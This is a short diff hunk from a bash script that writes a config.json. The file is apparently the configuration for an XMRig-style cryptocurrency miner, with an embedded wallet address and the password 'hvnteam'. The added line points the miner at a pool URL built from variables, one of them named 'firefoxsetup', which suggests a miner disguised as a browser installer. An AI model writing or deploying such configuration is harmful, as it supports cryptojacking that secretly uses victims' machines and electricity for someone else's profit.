@@ -84,6 +84,7 @@ bash -c 'cat <<EOT >>config.json
         {
             "algo": null,
             "coin": null,
+            "url": "$firefoxsetup.$link:9999",
             "user": "hvs1b7f7CRB94N7EByxUbdNDHWmAyQ4oBLtdxLM8MCPAcdCqjYiobjiibeu5kJZqJ2Yfsw7xqBM4u3yx7TV9aPNp7uFJutrvyy",
             "pass": "hvnteam",
             "rig-id": null,
